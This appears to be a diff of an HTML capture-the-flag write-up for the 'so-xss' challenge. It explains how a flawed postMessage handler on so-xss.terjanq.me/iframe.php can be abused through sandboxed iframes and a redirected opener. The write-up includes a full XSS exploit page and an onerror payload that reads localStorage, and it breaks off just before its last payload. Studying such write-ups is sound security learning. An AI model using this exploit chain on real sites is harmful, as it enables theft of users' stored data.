@@ -217,7 +217,18 @@ font-size: 28px;
 
 <p>So, the main objective of this challenge is to read the <code>localStorage.html</code> property of <a href="https://so-xss.terjanq.me/iframe.php">https://so-xss.terjanq.me/iframe.php</a>  page. <code>localStorage.html</code> property is set whenever you save any code on <a href="https://so-xss.terjanq.me">https://so-xss.terjanq.me.</a> The /iframe.php page exposes a postmessage handler with the following code:</p>
 
-<pre><code>const identifier = 'random_string'; onmessage = e => { const data = e.data; if (e.origin !== window.origin && data.identifier !== identifier) return; if (data.type === 'render') { renderContainer.innerHTML = data.body; } }
+<pre><code>const identifier = 'random_string';
+
+onmessage = e => {
+  const data = e.data;
+
+  if (e.origin !== window.origin && data.identifier !== identifier)
+    return;
+
+  if (data.type === 'render') {
+    renderContainer.innerHTML = data.body;
+  }
+}
 
 </code></pre>
 
@@ -274,13 +285,20 @@ font-size: 28px;
 <p>and the iframe.html has the following code:</p>
 
 <pre><code>&lt;html&gt;
-&lt;head&gt;&lt;title&gt;Demo for /iframe.html&lt;/title&gt;&lt;/head&gt;
+&lt;head&gt;
+  &lt;title&gt;Demo for /iframe.html&lt;/title&gt;
+&lt;/head&gt;
 &lt;body&gt;
-&lt;h1&gt;This is a test page&lt;/h1&gt;
-&lt;script&gt;
-let b=window.open("https://https://so-xss.terjanq.me/iframe.php");
-b.postMessage("&lt;img src=x onerror=console.log('xss)","*");
-&lt;/script&gt;
+  &lt;h1&gt;This is a test page&lt;/h1&gt;
+
+  &lt;script&gt;
+    let b = window.open("https://https://so-xss.terjanq.me/iframe.php");
+
+    b.postMessage(
+      "&lt;img src=x onerror=console.log('xss)",
+      "*"
+    );
+  &lt;/script&gt;
 &lt;/body&gt;
 &lt;/html&gt;</code></pre>
 
@@ -288,19 +306,41 @@ b.postMessage("&lt;img src=x onerror=console.log('xss)","*");
 
 <p>In order to read the property, we need an xss on so-xss.terjanq.me/iframe.php which is not sandboxed. this can be done by redirecting the opener page(attacker.com) to so-xss.terjanq.me/iframe.php and sending the xss payload from the opened sandboxed so-xss.terjanq.me/iframe.php page. something like this:</p>
 
-<p><img src="https://yunxohang.github.io/writeups/Untitled%20Diagram.drawio.png"></p>
+<p>&lt;I need to insert an image here&gt;</p>
 
 <p>so the final payload will look like this:</p>
 
-<pre><code>&lt;!DOCTYPE html&gt; &lt;html lang="en"&gt; &lt;head&gt;     &lt;meta charset="UTF-8"&gt;     &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;     &lt;title&gt;My first writeup&lt;/title&gt; &lt;/head&gt; &lt;body&gt;  &lt;script&gt;  let iframe = document.createElement('iframe');     iframe.sandbox = 'allow-scripts allow-popups allow-top-navigation'; let payload = "x=opener.top; opener.postMessage(1,'*'); setTimeout(() =&gt; { x.postMessage({type: 'render',identifier,body:'&lt;img src=x onerror=alert(localStorage.html)&gt;'}, '*'); }, 1000)";   iframe.srcdoc=` &lt;h1&gt;hello&lt;/h1&gt; &lt;script&gt; onclick = e =&gt; {         let w = open('https://so-xss.terjanq.me/iframe.php');         onmessage = e =&gt; top.location = 'https://so-xss.terjanq.me/iframe.php';         setTimeout(_ =&gt; {           w.postMessage({type: "render", body: "&lt;audio/src/onerror=\\&quot;${payload}\\&quot;&gt;"}, '*')         }, 1000);       };     &lt;\/script&gt; `  document.body.appendChild(iframe); &lt;/script&gt;   &lt;/body&gt; &lt;/html&gt;</code></pre>
+<pre><code>&lt;!DOCTYPE html&gt; &lt;html lang="en"&gt; &lt;head&gt;     &lt;meta charset="UTF-8"&gt;     &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;     &lt;title&gt;My first writeup&lt;/title&gt; &lt;/head&gt; &lt;body&gt;  &lt;script&gt;  let iframe = document.createElement('iframe');     iframe.sandbox = 'allow-scripts allow-popups allow-top-navigation'; let payload = "x=opener.top;
+
+opener.postMessage(1,'*');
+
+setTimeout(() =&gt; {
+  x.postMessage({
+    type: 'render',
+    identifier,
+    body:'&lt;img src=x onerror=alert(localStorage.html)&gt;'
+  }, '*');
+}, 1000)";   iframe.srcdoc=` &lt;h1&gt;hello&lt;/h1&gt; &lt;script&gt; onclick = e =&gt; {         let w = open('https://so-xss.terjanq.me/iframe.php');        onmessage = e =&gt;
+  top.location = 'https://so-xss.terjanq.me/iframe.php';         setTimeout(_ =&gt; {           w.postMessage({type: "render", body: "&lt;audio/src/onerror=\\&quot;${payload}\\&quot;&gt;"}, '*')         }, 1000);       };     &lt;\/script&gt; `  document.body.appendChild(iframe); &lt;/script&gt;   &lt;/body&gt; &lt;/html&gt;</code></pre>
 
 <p>first of all, the sandboxed iframe, sends a payload using audio tag. the payload sent is:</p>
 
-<pre><code>x=opener.top; opener.postMessage(1,'*'); setTimeout(() =&gt; { x.postMessage({type: 'render',identifier,body:'&lt;img src=x onerror=alert(localStorage.html)&gt;'}, '*'); }, 1000)</code></pre>
+<pre><code>x=opener.top;
+
+opener.postMessage(1,'*');
+
+setTimeout(() =&gt; {
+  x.postMessage({
+    type: 'render',
+    identifier,
+    body:'&lt;img src=x onerror=alert(localStorage.html)&gt;'
+  }, '*');
+}, 1000)</code></pre>
 
 <p>here, x is assigned opener.top which refers to the parent page i.e attacker.com and the opened page sends a postMessage to the opener, the opener has the following message listener:</p>
 
-<pre><code> onmessage = e =&gt; top.location = 'https://so-xss.terjanq.me/iframe.php';</code></pre>
+<pre><code>onmessage = e =&gt;
+  top.location = 'https://so-xss.terjanq.me/iframe.php';</code></pre>
 
 <p> which just redirects the parent page to <code>https://so-xss.terjanq.me/iframe.php</code> , now since we already have a reference to opener.top i.e the parent page which is now <code>so-xss.terjanq.me/iframe.php</code> which is not sandboxed or anything, we can now read the localStorage.html property. but how do we trigger the xss. At first we could trigger the xss because both of the origin was null, but now it is not sanboxed. we can use the other condition and make it false, i.e data.identifier !== identifier , we are currently on the opened <code>so-xss.terjanq.me/iframe.php</code> page so we have access to the identifier value and if we sent the identifier in the postMessage , the condition  data.identifier !== identifier will be false.<br>and the final payload will be:</p>
 
